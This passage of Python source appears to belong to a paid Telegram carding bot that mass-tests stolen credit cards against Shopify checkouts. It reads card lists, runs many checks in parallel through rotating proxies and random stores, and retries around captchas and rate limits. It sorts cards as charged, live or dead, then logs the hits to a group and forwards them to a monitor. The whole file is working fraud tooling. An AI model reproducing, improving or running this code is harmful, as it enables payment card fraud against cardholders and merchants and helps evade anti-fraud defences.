               f"𝗚𝗮𝘁𝗲 ➛ <b>{gateway_display}</b>\n"
               f'<tg-emoji emoji-id="{REPLY_EMOJI_ID}">❣️</tg-emoji> <b>{safe_response}</b>\n'
               f"𝗨𝘀𝗲𝗿 ➛ {user_link} {random_star()}\n")
    reply_markup = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="𝑰𝑵𝑭𝑬𝑹𝑵𝑶 𝑿 𝑪𝑯𝑲", url="https://t.me/InfernoXchk_bot")]])
    try:
        await hit_log_limiter.wait()
        await log_bot.send_message(chat_id=HIT_LOG_GROUP_ID, text=caption, parse_mode="HTML", reply_markup=reply_markup, disable_web_page_preview=True)
    except Exception as e:
        logging.error(f"Error sending hit log: {e}")

async def send_approved_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name, currency="USD"):
    bin_scheme = html_escape(str(bin_data.get("scheme", "N/A")))
    bin_bank = html_escape(str(bin_data.get("bank", "N/A")))
    country_name = safe_html(bin_data.get("country", "N/A"))
    country_flag = bin_data.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name
    gateway_display = html_escape(f"Shopify {api_price} {currency}")
    user_link = build_user_link(user_obj)
    dev_link = '<a href="tg://openmessage?user_id=8801932812">𝗡𝗔𝗥𝗨𝗧𝗢</a>'
    user_display = f"{user_link} <b>({plan_name})</b>"
    caption = gate_result_caption(cmd="MSH", status='APPROVED <tg-emoji emoji-id="5870702999180942496">✅</tg-emoji>',
        card=html_escape(cc_formatted), gateway=gateway_display, response=safe_html(response_msg),
        brand=bin_scheme, issuer=bin_bank, country=bin_country,
        user_display=user_display, dev_link=dev_link, proxy=proxy_status_formatted)
    reply_markup = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="𝑰𝑵𝑭𝑬𝑹𝑵𝑶 𝑿 𝑪𝑯𝑲", url="https://t.me/InfernoXchk_bot")]])
    try:
        sent = await send_random_video(bot, user_obj.id, caption=caption)
        if not sent:
            await bot.send_message(chat_id=user_obj.id, text=caption, parse_mode="HTML", reply_markup=reply_markup)
    except (TelegramForbiddenError, TelegramBadRequest) as e:
        logging.warning(f"[MSH] DM approved to {user_obj.id} failed: {e}")
    except Exception as e:
        logging.error(f"Error sending approved DM: {e}")

async def send_charged_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name, currency="USD"):
    bin_scheme = html_escape(str(bin_data.get("scheme", "N/A")))
    bin_bank = html_escape(str(bin_data.get("bank", "N/A")))
    country_name = html_escape(str(bin_data.get("country", "N/A")))
    country_flag = bin_data.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name
    gateway_display = html_escape(f"Shopify {api_price} {currency}")
    user_link = build_user_link(user_obj)
    dev_link = '<a href="tg://openmessage?user_id=8801932812">𝗡𝗔𝗥𝗨𝗧𝗢</a>'
    user_display = f"{user_link} <b>({plan_name})</b>"
    caption = gate_result_caption(cmd="MSH", status=f"𝗖𝗛𝗔𝗥𝗚𝗘𝗗 {random_diamond()}",
        card=html_escape(cc_formatted), gateway=gateway_display, response=safe_html(response_msg),
        brand=bin_scheme, issuer=bin_bank, country=bin_country,
        user_display=user_display, dev_link=dev_link, proxy=proxy_status_formatted)
    reply_markup = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="𝑰𝑵𝑭𝑬𝑹𝑵𝑶 𝑿 𝑪𝑯𝑲", url="https://t.me/InfernoXchk_bot")]])
    try:
        msg_id = await send_random_video(bot, user_obj.id, caption=caption)
        if msg_id:
            try: await bot.pin_chat_message(chat_id=user_obj.id, message_id=msg_id)
            except Exception: pass
        else:
            msg = await bot.send_message(chat_id=user_obj.id, text=caption, parse_mode="HTML", reply_markup=reply_markup)
            try: await bot.pin_chat_message(chat_id=user_obj.id, message_id=msg.message_id)
            except Exception: pass
    except (TelegramForbiddenError, TelegramBadRequest) as e:
        logging.warning(f"[MSH] DM charged to {user_obj.id} failed: {e}")
    except Exception as e:
        logging.error(f"Error sending charged DM: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BUTTONS + PROGRESS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_result_buttons(session_id: str, is_running: bool = True) -> dict:
    session = MSH_SESSIONS.get(session_id, {})
    buttons = [
        [{"text": f"Lɪᴠᴇ ({session.get('approved', 0)})", "callback_data": MshResultCallback(session_id=session_id, result_type="live").pack()},
         {"text": f"Dᴇᴀᴅ ({session.get('dead', 0)})", "callback_data": MshResultCallback(session_id=session_id, result_type="dead").pack()}],
        [{"text": f"Cʜᴀʀɢᴇᴅ ({session.get('charged', 0)})", "callback_data": MshResultCallback(session_id=session_id, result_type="charged").pack()},
         {"text": f"Aʟʟ ({session.get('checked', 0)})", "callback_data": MshResultCallback(session_id=session_id, result_type="all").pack()}]
    ]
    if is_running:
        buttons.append([{"text": "Sᴛᴏᴘ Cʜᴇᴄᴋɪɴɢ", "callback_data": MshStopCallback(session_id=session_id).pack()}])
    return {"inline_keyboard": buttons}

async def update_progress_message(bot: Bot, session_id):
    session = MSH_SESSIONS.get(session_id)
    if not session: return
    if time.time() < session.get('flood_until', 0): return

    is_finished = session['status'] == "FINISHED"
    is_stopped = session['status'] == "STOPPED"

    if session_id not in SESSION_LOCKS:
        SESSION_LOCKS[session_id] = asyncio.Lock()

    async with SESSION_LOCKS[session_id]:
        current_time = time.time()
        if time.time() < session.get('flood_until', 0): return
        if not is_finished and not is_stopped and (current_time - session.get('last_update_time', 0)) < 30.0:
            return

        elapsed = current_time - session['start_time']
        mins, secs = int(elapsed // 60), int(elapsed % 60)
        elapsed_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"

        text = mass_status_frame("𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗠𝗔𝗦𝗦", session['status'],
            session['checked'], session['total'], session['approved'],
            session['charged'], session['dead'], session['errors'],
            elapsed_str, session_id)

        if session.get('last_text') == text: return

        reply_markup = get_result_buttons(session_id, is_running=(session['status'] == "CHECKING"))
        try:
            await bot.edit_message_text(chat_id=session['chat_id'], message_id=session['msg_id'], text=text, parse_mode="HTML", reply_markup=reply_markup)
            session['last_text'] = text
            session['last_update_time'] = current_time
        except TelegramRetryAfter as e:
            session['flood_until'] = time.time() + e.retry_after + 2
        except TelegramBadRequest as e:
            if "message is not modified" not in str(e).lower():
                logging.error(f"Error updating progress: {e}")
        except Exception as e:
            logging.error(f"Error updating progress: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SINGLE CARD (uses inline NodeManager via _check_card_site)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, user_obj, plan_name):
    session = MSH_SESSIONS.get(session_id)
    if not session or is_session_stopped(session_id): return
    is_premium = session.get('is_premium', False)

    sites_list = get_sites()
    if not sites_list:
        session['errors'] += 1
        return

    proxy_manager = session.get('proxy_manager')
    if not proxy_manager:
        session['errors'] += 1
        return

    DECLINED_RESPONSES = [
        'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_ERROR', 'GENERIC_DECLINE',
        'DO_NOT_HONOR', 'UNKNOWN_ERROR', 'UNKNOWN ERROR', 'PICK_UP_CARD', 'DECISION_RULE_BLOCK',
        'FRAUD_SUSPECTED', 'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD',
        'TEST_MODE_LIVE_CARD', 'AMOUNT_TOO_SMALL', 'INCORRECT_NUMBER', 'EXPIRED_CARD',
        'EMPTY SUBMIT RESPONSE', 'INVALID JSON IN SUBMIT RESPONSE', 'INVALID JSON RESPONSE',
        'POLICY_CLASS', 'VALIDATION_CUSTOM', 'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED',
        'ARTIFACT_DISSATISFACTION', 'PAYMENTS_CREDIT_CARD_GENERIC',
        'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED', 'CART FAILED WITH STATUS',
        'UNABLE TO GET PAYMENT TOKEN', 'EMPTY RECEIPT', 'RECEIPT ID MISSING',
        'SITE NOT SUPPORTED'
    ]

    RETRY_KEYWORDS = [
        'r4 token empty', 'payment method is not shopify', 'r2 id empty',
        'product not found', 'hcaptcha detected', 'site error! status: 429',
        'site requires login', 'failed to get checkout', 'captcha at checkout',
        'failed to get session token', 'timeout', '502', '503', '504',
        'bad gateway', 'gateway timeout', 'empty submit response',
        'invalid json in submit response', 'invalid json response',
        'policy_class', 'validation_custom', 'delivery_delivery_line_detail_changed',
        'artifact_dissatisfaction', 'payments_credit_card_generic',
        'payments_credit_card_brand_not_supported', 'cart failed with status',
        'unable to get payment token', 'empty receipt', 'receipt id missing',
        'site not supported', 'total changed', 'no payment token', 'cart 429',
        'no session token', 'status 429', 'captcha_required',
        'merchandise_expected_price_mismatch', 'test_mode', 'proxy_dead',
        'tax_new_tax_must_be_accepted', '<html', 'site error (http 429)'
    ]

    result_status = "ERROR"
    response_msg = "Unknown Error"
    api_price = "0.00"
    proxy_status_formatted = "Unknown"
    bin_data = {}
    used_proxy = None
    currency = "USD"
    used_site = ""
    used_node = ""

    MAX_RETRIES = 5
    price_retries = 0
    attempt = 0

    try:
        bin_data = await get_bin_info(cc_num[:6])
    except Exception:
        bin_data = {}

    while attempt < MAX_RETRIES and not is_session_stopped(session_id):
        attempt += 1
        proxy_result = proxy_manager.get_next_proxy()
        if not proxy_result:
            session['errors'] += 1
            return

        proxy, _ = proxy_result
        used_proxy = proxy
        site = random.choice(sites_list)
        used_site = site

        try:
            raw = await _check_card_site(_MSH_NODE_MGR, cc_formatted, site, proxy)
            if is_session_stopped(session_id):
                return

            response_text = str(raw.get("Response", ""))
            status_field = str(raw.get("Status", ""))
            api_price = str(raw.get("Price", "0.00")).lstrip("$") or "0.00"
            used_node = str(raw.get("_node", ""))
            proxy_status_formatted = "Live <tg-emoji emoji-id=\"5854964615510762741\">🟢</tg-emoji>"

            proxy_manager.report_result(proxy, response_text, 200)

            try:
                clean_price = float(re.sub(r'[^\d.]', '', str(api_price)))
                if clean_price > 5.00:
                    price_retries += 1
                    if price_retries < MAX_RETRIES:
                        await asyncio.sleep(0.3)
                        continue
                    else:
                        result_status = "DEAD"
                        response_msg = "PRICE_TOO_HIGH"
                        break
            except (ValueError, TypeError):
                pass

            message_upper = response_text.upper()
            message_lower = response_text.lower()

            if status_field == "Charged":
                result_status = "CHARGED"
                response_msg = safe_html(response_text) if response_text else "ORDER_PAID"
                break
            if status_field == "Approved":
                result_status = "APPROVED"
                response_msg = safe_html(response_text) if response_text else "APPROVED"
                break

            if any(k in message_upper for k in ("ORDER PLACED", "ORDER_PLACED", "ORDER_PAID", "ORDER PAID", "CHARGED", "PAYMENT_SUCCESS", "THANK YOU")):
                result_status = "CHARGED"; response_msg = safe_html(response_text); break
            if ("3DS_REQUIRED" in message_upper or "INSUFFICIENT_FUND" in message_upper
                or "DS_REQUIRED" in message_upper or "INVALID_CVC" in message_upper
                or "OTP_REQUIRED" in message_upper or "APPROVED" in message_upper):
                result_status = "APPROVED"; response_msg = safe_html(response_text); break
            if ("CARD_DECLINED" in message_upper or "DECLINED" in message_upper
                or "DO_NOT_HONOR" in message_upper
                or any(d in message_upper for d in DECLINED_RESPONSES)):
                result_status = "DEAD"; response_msg = "CARD_DECLINED"; break

            is_proxy_error = ("proxy burned" in message_lower
                or "change your proxy" in message_lower
                or "proxy error" in message_lower
                or proxy_manager.is_real_proxy_error(response_text, 200))
            if is_proxy_error:
                if attempt == MAX_RETRIES:
                    result_status = "ERROR"; response_msg = f"Proxy Error: {response_text[:60]}"; break
                await asyncio.sleep(0.5); continue

            if any(retry_err.lower() in message_lower for retry_err in RETRY_KEYWORDS):
                if attempt < MAX_RETRIES:
                    await asyncio.sleep(0.3); continue
                else:
                    result_status = "DEAD"; response_msg = "CARD_DECLINED"; break

            if attempt < MAX_RETRIES:
                await asyncio.sleep(0.3); continue
            else:
                result_status = "ERROR"
                response_msg = safe_html(response_text) if response_text else "Unknown Response"
                break

        except asyncio.CancelledError:
            raise
        except Exception as e:
            logging.warning(f"[MSH] _check_card_site exception for {cc_formatted}: {e}")
            if attempt == MAX_RETRIES:
                result_status = "ERROR"; response_msg = f"Connection Error: {str(e)[:50]}"; break
            await asyncio.sleep(0.5); continue

    if is_session_stopped(session_id): return

    print(f"{cc_formatted} | {result_status} | {response_msg} | {api_price} {currency} | {used_node}")
    session['checked'] += 1

    card_result_data = {
        'card': cc_formatted, 'response': response_msg, 'bin_info': bin_data,
        'price': api_price, 'currency': currency, 'gateway': 'Shopify',
        'timestamp': datetime.now().isoformat(),
        'proxy_used': mask_proxy(used_proxy) if used_proxy else 'N/A',
        'site': used_site, 'node': used_node,
    }

    if result_status == "CHARGED":
        session['charged'] += 1; session['charged_cards'].append(card_result_data)
        tasks = [asyncio.to_thread(update_user_stats, user_id, True), asyncio.to_thread(update_user_hits, user_id)]
        if not is_premium and user_id not in ADMIN_IDS:
            tasks.append(asyncio.to_thread(deduct_credits_atomic, user_id, 2))
        await asyncio.gather(*tasks)
        await asyncio.gather(
            send_hit_log_to_group(bot, response_msg, user_obj, plan_name, proxy_status_formatted, api_price, currency),
            send_charged_msg_to_user(bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name, currency),
            _monitor_forward(bot, gate="Shopify Mass (MSH)", status="CHARGED", card=cc_formatted, site=used_site, amount=f"{api_price} {currency}", extra=response_msg, user_obj=user_obj),
        )
    elif result_status == "APPROVED":
        session['approved'] += 1; session['live_cards'].append(card_result_data)
        tasks = [asyncio.to_thread(update_user_stats, user_id, True)]
        if not is_premium and user_id not in ADMIN_IDS:
            tasks.append(asyncio.to_thread(deduct_credits_atomic, user_id, 1))
        await asyncio.gather(*tasks)
        await asyncio.gather(
            send_approved_msg_to_user(bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name, currency),
            _monitor_forward(bot, gate="Shopify Mass (MSH)", status="LIVE", card=cc_formatted, site=used_site, amount=f"{api_price} {currency}", extra=response_msg, user_obj=user_obj),
        )
        if "INSUFFICIENT" in (response_msg or "").upper():
            await _monitor_forward(bot, gate="Shopify Mass (MSH)", status="INSUFFICIENT", card=cc_formatted, site=used_site, amount=f"{api_price} {currency}", extra=response_msg, user_obj=user_obj)
    elif result_status == "DEAD":
        session['dead'] += 1; session['dead_cards'].append(card_result_data)
        tasks = [asyncio.to_thread(update_user_stats, user_id, False)]
        if not is_premium and user_id not in ADMIN_IDS:
            tasks.append(asyncio.to_thread(deduct_credits_atomic, user_id, 1))
        await asyncio.gather(*tasks)
    elif result_status == "ERROR":
        session['errors'] += 1; session['error_cards'].append(card_result_data)
        await asyncio.to_thread(update_user_stats, user_id, False)

    await update_progress_message(bot, session_id)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACKS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.callback_query(MshResultCallback.filter())
async def handle_result_callback(callback: types.CallbackQuery, callback_data: MshResultCallback):
    try:
        session = MSH_SESSIONS.get(callback_data.session_id)
        if not session:
            await callback.answer("⚠️ Session expired", show_alert=True); return
        if callback.from_user.id != session.get('user_id'):
            await callback.answer("❌ No permission", show_alert=True); return
        if is_buttons_locked(callback_data.session_id):
            await callback.answer(f"⏳ Wait {get_remaining_lock(callback_data.session_id)}s", show_alert=True); return

        rt = callback_data.result_type
        if rt == "charged": count = len(session.get('charged_cards', []))
        elif rt == "live": count = len(session.get('live_cards', []))
        elif rt == "dead": count = len(session.get('dead_cards', []))
        else: count = sum(len(session.get(k, [])) for k in ('charged_cards','live_cards','dead_cards','error_cards'))

        if count == 0:
            await callback.answer("❌ No cards", show_alert=True); return

        await callback.answer("📦 Generating...", show_alert=False)
        user_obj = session.get('user_obj')
        plan_name = session.get('plan_name', 'TRIAL')
        user_msg_id = session.get('user_msg_id')

        file_buffer, filename, total_count = generate_result_file(session, rt, user_obj, plan_name)
        file_content = file_buffer.read()

        emoji = {"charged": random_diamond(), "live": "✅", "dead": "❌", "all": "📁"}.get(rt, "📁")
        label = {"charged": "CHARGED", "live": "Live", "dead": "Dead", "all": "All"}.get(rt, "All")
        caption = f"Result Type → {label} {emoji}\nTotal Cards → <b>{total_count}</b>\nGateway → Shopify Mass"

        document = types.BufferedInputFile(file=file_content, filename=filename)
        try:
            await callback.bot.send_document(chat_id=callback.message.chat.id, document=document, caption=caption, parse_mode="HTML", reply_to_message_id=user_msg_id)
        except TelegramBadRequest as e:
            if "message to reply not found" in str(e).lower():
                await callback.message.answer_document(document=document, caption=caption, parse_mode="HTML")
            else: raise
    except Exception as e:
        logging.error(f"Error handling result callback: {e}", exc_info=True)

@router.callback_query(MshStopCallback.filter())
async def handle_stop_callback(callback: types.CallbackQuery, callback_data: MshStopCallback):
    try:
        session = MSH_SESSIONS.get(callback_data.session_id)
        if not session:
            await callback.answer("⚠️ Session expired", show_alert=True); return
        if callback.from_user.id != session.get('user_id'):
            await callback.answer("❌ No permission", show_alert=True); return
        if session['status'] != "CHECKING":
            await callback.answer("ℹ️ Not running", show_alert=True); return

        session['status'] = "STOPPED"
        for task in session.get('tasks', []):
            if not task.done(): task.cancel()
        await callback.answer("🛑 Stopping...", show_alert=False)
        session['last_text'] = ""
        await update_progress_message(callback.bot, callback_data.session_id)
    except Exception as e:
        logging.error(f"Error handling stop callback: {e}", exc_info=True)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API MANAGEMENT COMMANDS (now against _MSH_NODE_MGR)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(Command("apistats"))
async def apistats_command(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ Not authorized.", parse_mode="HTML"); return

    nodes = _MSH_NODE_MGR.list_nodes()
    text = "🔌 <b>API Node Status</b>\n<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
    for n in nodes:
        icon = "✅" if n["available"] else ("🟡" if n["on_cooldown"] else "❌")
        text += f"{icon} <b>{n['name']}</b>\n"
        text += f"   └─ OK: <code>{n['total_ok']}</code> | Fail: <code>{n['total_fail']}</code> | Active: <code>{n['active']}</code>\n"
        if n["on_cooldown"]:
            text += f"   └─ Cooldown: <code>{n['cooldown']}s</code>\n"
        text += "\n"

    healthy = sum(1 for n in nodes if n["available"])
    text += f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n<b>Total:</b> <code>{len(nodes)}</code> | <b>Available:</b> <code>{healthy}</code>"
    await message.answer(text, parse_mode="HTML")

@router.message(Command("addapi"))
async def addapi_command(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ Not authorized.", parse_mode="HTML"); return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("❌ Usage: /addapi <code>https://example.com</code>", parse_mode="HTML"); return

    new_api = parts[1].strip()
    if _MSH_NODE_MGR.add_node(new_api):
        await message.answer(f"✅ <b>Node Added!</b>\n\n<b>URL:</b> <code>{new_api}</code>\n<b>Total Nodes:</b> <code>{len(_MSH_NODE_MGR._nodes)}</code>", parse_mode="HTML")
    else:
        await message.answer("⚠️ <b>Node already exists!</b>", parse_mode="HTML")

@router.message(Command("removeapi"))
async def removeapi_command(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ Not authorized.", parse_mode="HTML"); return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("❌ Usage: /removeapi <code>index</code>", parse_mode="HTML"); return

    try:
        idx = int(parts[1].strip()) - 1
    except ValueError:
        await message.answer("❌ Provide a valid number.", parse_mode="HTML"); return

    removed = _MSH_NODE_MGR.remove_node_by_index(idx)
    if removed:
        await message.answer(f"✅ <b>Removed:</b> <code>{removed}</code>\n<b>Remaining:</b> <code>{len(_MSH_NODE_MGR._nodes)}</code>", parse_mode="HTML")
    else:
        await message.answer("❌ Invalid index.", parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/msh") | F.caption.startswith("/msh"))
async def msh_command(message: types.Message):
    if not await asyncio.to_thread(is_gate_enabled, "msh"):
        await message.reply("🚧 <b>Mass Gate under Maintenance.</b>", parse_mode="HTML"); return

    user = message.from_user
    user_id = user.id
    bot = message.bot
    is_premium, _ = get_premium_status(user_id)

    for s in MSH_SESSIONS.values():
        if s.get('user_id') == user_id and s.get('status') == "CHECKING":
            await message.reply("⚠️ <b>Active Session</b>\n\nStop the running one first.", parse_mode="HTML"); return

    user_proxies = await get_user_proxies(user_id)
    if not user_proxies:
        user_proxies = await get_user_proxies(8058825724)
        if not user_proxies:
            await message.reply("❌ <b>No proxies found.</b>\n\nAdd with <code>/proxy</code>.", parse_mode="HTML"); return

    raw_text = ""
    cmd_text = message.text or message.caption or ""
    parts = cmd_text.split(maxsplit=1)
    if len(parts) > 1: raw_text += parts[1] + " "

    if message.reply_to_message:
        rm = message.reply_to_message
        if rm.text: raw_text += rm.text + " "
        elif rm.caption: raw_text += rm.caption + " "

    document = message.document
    if not document and message.reply_to_message:
        document = message.reply_to_message.document

    if document:
        if document.file_size > 2 * 1024 * 1024:
            await message.reply("❌ File too large. Max 2MB."); return
        try:
            fi = await bot.get_file(document.file_id)
            bc = await bot.download_file(fi.file_path)
            if bc:
                data = bc.read() if hasattr(bc, 'read') else bc
                raw_text += data.decode('utf-8', errors='ignore')
        except Exception as e:
            await message.reply(f"❌ Error reading file: {e}"); return

    if not raw_text.strip():
        await message.reply("❌ <b>No cards.</b>\n\n• <code>/msh cc|mm|yy|cvv</code>\n• Reply to cards\n• .txt file", parse_mode="HTML"); return

    extracted = extract_cards_from_text(raw_text)
    if not extracted:
        await message.reply("❌ No valid card formats.", parse_mode="HTML"); return

    valid_cards, exp, bad = [], 0, 0
    for cs in extracted:
        p = cs.split('|')
        if len(p) != 4: continue
        cc, mm, yy, cvv = p
        if not luhn_check(cc): bad += 1; continue
        if is_expired(mm, yy): exp += 1; continue
        valid_cards.append((cs, cc))

    total = len(valid_cards)
    if total == 0:
        fi = f"Filtered {bad} invalid & {exp} expired.\n" if exp or bad else ""
        await message.reply(f"{fi}❌ No valid cards to check.", parse_mode="HTML"); return

    if not is_premium and user_id not in ADMIN_IDS:
        cur = await asyncio.to_thread(get_user_credits, user_id)
        if cur <= 0:
            await message.reply("❌ <b>No Credits Left</b>\n\nUse /buy.", parse_mode="HTML"); return
        if cur < total:
            valid_cards = valid_cards[:cur]; total = len(valid_cards)
            await message.reply(f"⚠️ <b>Credits Limit</b>\n\nYou have {cur}. Processing {total}.", parse_mode="HTML")

    if total > 10000:
        valid_cards = valid_cards[:10000]; total = len(valid_cards)
        await message.reply(f"⚠️ <b>Limit</b>\n\nProcessing {total} cards.", parse_mode="HTML")

    asyncio.create_task(process_mass_check_background(message, bot, valid_cards, user, user_proxies, is_premium=is_premium))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_mass_check_background(message, bot, valid_cards, user_obj, user_proxies, is_group=False, is_premium=False):
    user_id = user_obj.id
    chat_id = message.chat.id
    total_cards = len(valid_cards)
    session_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    plan_name = await get_user_plan_name(user_id)
    proxy_manager = ProxyManager(user_proxies, session_id)

    _MSH_NODE_MGR.start_health_polling()

    initial_text = mass_status_frame("𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗠𝗔𝗦𝗦", "CHECKING", 0, total_cards, 0, 0, 0, 0, "0s", session_id)
    progress_msg = await message.reply(initial_text, parse_mode="HTML", reply_markup=get_result_buttons(session_id, is_running=True))

    MSH_SESSIONS[session_id] = {
        "session_id": session_id, "status": "CHECKING", "chat_id": chat_id, "user_id": user_id,
        "msg_id": progress_msg.message_id, "user_msg_id": message.message_id, "total": total_cards,
        "checked": 0, "approved": 0, "charged": 0, "dead": 0, "errors": 0, "start_time": time.time(),
        "tasks": [], "proxies": user_proxies, "proxy_manager": proxy_manager,
        "last_text": "", "last_update_time": 0,
        "live_cards": [], "dead_cards": [], "charged_cards": [], "error_cards": [],
        "user_obj": user_obj, "plan_name": plan_name, "is_group": is_group, "is_premium": is_premium,
    }

    asyncio.create_task(run_mass_checker(bot, session_id, valid_cards, user_obj, plan_name))

async def run_mass_checker(bot: Bot, session_id, cards, user_obj, plan_name):
    session = MSH_SESSIONS.get(session_id)
    if not session: return
    sem = asyncio.Semaphore(100)

    async def worker(cc_formatted, cc_num):
        if is_session_stopped(session_id): return
        async with sem:
            if is_session_stopped(session_id): return
            try:
                await process_single_card(session_id, cc_formatted, cc_num, session['user_id'], bot, user_obj, plan_name)
            except asyncio.CancelledError: raise
            except Exception as e:
                if not is_session_stopped(session_id):
                    logging.error(f"Worker error for {cc_formatted}: {e}")

    tasks = []
    for cc_formatted, cc_num in cards:
        if is_session_stopped(session_id): break
        t = asyncio.create_task(worker(cc_formatted, cc_num))
        tasks.append(t)
        session['tasks'].append(t)

    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)

    session = MSH_SESSIONS.get(session_id)
    if session and session['status'] != "STOPPED":
        session['status'] = "FINISHED"

    await update_progress_message(bot, session_id)